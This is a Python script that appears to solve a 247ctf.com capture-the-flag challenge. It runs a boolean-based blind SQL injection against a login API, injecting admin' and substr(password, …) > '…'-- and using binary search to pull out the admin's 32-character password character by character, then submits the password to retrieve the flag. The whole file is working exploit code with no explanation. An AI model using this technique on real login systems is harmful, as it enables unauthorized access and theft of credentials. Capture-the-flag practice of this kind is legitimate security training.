import requests
import re
import string

url = "https://4409a59c80500d58.247ctf.com/"
s = requests.Session()

def reset_token():
    res = s.get(f'{url}/api/get_token')

    token = re.findall(r'reset to (.+)!', res.text)[0].strip()

    return token

def req(username):
    res = s.post(f'{url}/api/login', data={
        'username': username,
        'password': "",
        'api': token
    })

    return res.text

def leak(payload):
    resp = req(f"admin' and {payload}--")

    if "128" in resp:
        exit("> Ran out of requests")

    return "invalid" not in resp.lower()

# get api token
token = reset_token()
print("Token:", token)

# bruteforce password
password = ''
charset = string.digits + "abcdef"

def bin_search(arr, idx):
    low, high = 0, len(arr) - 1

    while low < high:
        mid = (low + high) // 2
        char = arr[mid]

        print("Password:", password, '|', f'{len(password)}/32', '|', ''.join(arr[low : high + 1]))

        if leak(f"substr(password, {idx}, 1) > '{char}'"):
            low = mid + 1
        else:
            high = mid

    return arr[low]

while len(password) < 32:
    char = bin_search(charset, len(password) + 1)

    password += char

print("Password:", password)

res = s.post(f'{url}/api/get_flag', data={
    'password': password
})

flag = res.json()['message']
print("Flag:", flag)